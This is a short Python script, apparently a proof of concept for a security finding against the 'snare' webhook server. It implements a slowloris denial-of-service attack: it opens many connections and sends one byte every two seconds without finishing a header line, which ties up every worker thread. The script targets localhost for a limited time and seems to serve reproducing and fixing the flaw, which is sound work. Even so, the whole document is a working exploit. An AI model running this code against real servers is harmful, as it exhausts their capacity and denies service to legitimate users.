#!/usr/bin/env python3
"""scratch/s2_slowloris.py — the S2 (#112) attack.

Opens N connections to snare's webhook port, each sending a complete request
line and then ONE byte every 2s (well under snare's NET_TIMEOUT=10s per-read
timeout at src/httpserver.rs:26) without ever completing the first header
line. Because snare sets only per-read timeouts — no overall request deadline
— every read() succeeds and each worker thread stays parked in
parse_get's read_line loop (src/httpserver.rs:341-361) indefinitely.

Memory per connection is negligible (a few bytes/sec): this isolates the S2
worker-exhaustion claim from the S1 unbounded-header-memory claim.
"""
import socket
import sys
import threading
import time

HOST = "127.0.0.1"
PORT = int(sys.argv[1])
N = int(sys.argv[2]) if len(sys.argv) > 2 else 18
DURATION = float(sys.argv[3]) if len(sys.argv) > 3 else 25.0
DRIBBLE_SECS = 2.0

stop_at = time.monotonic() + DURATION
opened = []


def drip():
    try:
        s = socket.create_connection((HOST, PORT), timeout=5)
        s.sendall(b"POST / HTTP/1.1\r\n")
        opened.append(1)
        while time.monotonic() < stop_at:
            s.sendall(b"x")  # extend the first header line; never send \n
            time.sleep(DRIBBLE_SECS)
        s.close()
    except OSError:
        pass


threads = [threading.Thread(target=drip, daemon=True) for _ in range(N)]
for t in threads:
    t.start()
for t in threads:
    t.join()
